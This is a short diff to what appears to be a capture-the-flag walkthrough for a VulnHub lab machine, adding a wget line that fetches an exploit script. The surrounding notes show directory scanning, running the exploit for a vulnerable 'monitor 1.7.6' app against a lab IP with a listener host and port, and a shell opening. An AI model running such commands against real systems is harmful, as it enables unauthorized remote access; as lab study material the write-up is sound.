@@ -21,6 +21,8 @@ dirb http://192.168.100.100
 
 monitor 1.7.6 exploit found
 
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/icmp/48980.py
+
 python 48980.py http://192.168.100.100/mon 192.168.100.14 5555
 
 shell opened and --> cat reminder
